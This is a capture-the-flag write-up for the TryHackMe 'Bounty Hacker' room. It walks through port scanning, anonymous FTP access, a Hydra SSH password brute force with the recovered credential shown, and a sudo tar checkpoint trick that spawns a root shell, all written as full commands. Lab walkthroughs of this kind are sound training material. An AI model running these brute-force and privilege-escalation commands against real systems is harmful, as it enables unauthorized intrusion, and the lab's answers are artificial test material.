# Bounty Hacker — TryHackMe Write-up

## 1. Enumeration

Started with an Nmap scan to identify open ports and running services:

```bash
nmap -sC -sV <TARGET_IP>
```

The scan revealed three open ports:

| Port | Service | Version |
|---|---|---|
| 21 | FTP | vsftpd 3.0.5 |
| 22 | SSH | OpenSSH 8.2p1 Ubuntu |
| 80 | HTTP | Web server |

The most interesting finding was on port 21:

```text
21/tcp open ftp vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed
```

Anonymous FTP access was enabled, meaning I could connect to the FTP server without valid credentials.

I checked the website on port 80, but it did not reveal any useful information, so I focused on FTP.

## 2. FTP Enumeration

Connected to the FTP server:

```bash
ftp <TARGET_IP>
```

Used `anonymous` as the username.

After successfully connecting, I listed the directory contents:

```ftp
ls
```

Found two files:

- `locks.txt` — a list of possible passwords.
- `task.txt` — a text file containing a short message signed by `-lin`.

The signature suggested that `lin` might be a valid username.

Downloaded both files:

```ftp
get locks.txt
get task.txt
```

## 3. SSH Brute Force

Based on the information from `task.txt`, I assumed that `lin` was the SSH username.

I used the password list from `locks.txt` with Hydra:

```bash
hydra -l lin -P locks.txt <TARGET_IP> -t 4 ssh
```

Hydra successfully found valid credentials:

```text
[22][ssh] host: <TARGET_IP>
login: lin
password: RedDr4gonSynd1cat3
```

## 4. SSH Access and User Flag

Connected to the target machine using the discovered credentials:

```bash
ssh lin@<TARGET_IP>
```

After successfully logging in, I explored the user's Desktop directory and found the user flag.

Retrieved it using:

```bash
cat user.txt
```

## 5. Sudo Privileges Enumeration

Next, I checked which commands the current user could execute with elevated privileges:

```bash
sudo -l
```

The output showed:

```text
User lin may run the following commands:
    (root) /bin/tar
```

This meant that `lin` was allowed to execute `/bin/tar` as root.

Since `tar` supports command execution through its checkpoint functionality, this could potentially be used for privilege escalation.

## 6. Privilege Escalation via GTFOBins

I searched for `/bin/tar` on GTFOBins and found a method to spawn a root shell using the checkpoint feature.

Executed:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Explanation:

- `-c` — create an archive.
- `-f /dev/null` — write the archive to `/dev/null`.
- `--checkpoint=1` — trigger a checkpoint after one record.
- `--checkpoint-action=exec=/bin/sh` — execute `/bin/sh` when the checkpoint is reached.

Because `tar` was executed through sudo as root, the spawned shell inherited root privileges.

Verified the result:

```bash
id
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
```

Successfully obtained a root shell.

## 7. Root Flag

Finally, retrieved the root flag:

```bash
cat /root/root.txt
```

This completed the room.

---

## Attack Chain

```text
Nmap Enumeration
       |
       v
FTP Anonymous Login
       |
       v
Download locks.txt and task.txt
       |
       v
Identify username: lin
       |
       v
Hydra SSH Brute Force
       |
       v
SSH Access as lin
       |
       v
User Flag
       |
       v
sudo -l
       |
       v
/bin/tar
       |
       v
GTFOBins Checkpoint Exploit
       |
       v
Root Shell
       |
       v
Root Flag
```

## What I Learned

- Identifying anonymous FTP access using Nmap.
- Enumerating FTP directories and downloading files.
- Using information disclosure to identify potential usernames.
- Performing targeted SSH password brute forcing with Hydra.
- Enumerating sudo permissions with `sudo -l`.
- Using GTFOBins to identify privilege escalation techniques.
- Exploiting `tar` checkpoint functionality to obtain a root shell.
